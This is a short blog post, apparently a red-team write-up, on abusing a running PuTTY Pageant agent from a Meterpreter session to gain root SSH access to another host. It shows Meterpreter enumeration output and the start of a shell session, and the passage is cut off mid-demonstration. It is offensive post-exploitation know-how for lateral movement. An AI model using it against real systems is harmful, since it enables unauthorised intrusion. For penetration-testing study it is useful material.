= Free Shells with Plink and Pageant
:hp-tags: metasploit, meterpreter, putty, ssh

Watching [Egypt](http://twitter.com/egyp7)’s talk at DEFCON 20 he mentioned the ability to jump on on a system when pageant (puTTY’s ssh-agent equivalent) is running. So I wanted to figure out the best way to get this going. Here is what I came up with:

```    
meterpreter > run enum_putty
[*] Putty Installed for [["Administrator"]]
[*] Saved SSH Server Public Keys:
[*]     rsa2@22:172.16.10.150
[*] Session corp_webserver:
[*]     Protocol: SSH
[*]     Hostname: 172.16.10.150
[*]     Username: root
[*]     Public Key:
meterpreter >
```

Awesome, this guy runs as root and we have the IP address. But it doesn’t have any public keys listed. That’s ok because Pageant is running. 

```   
meterpreter > shell
Process 3364 created.
Channel 1 created.
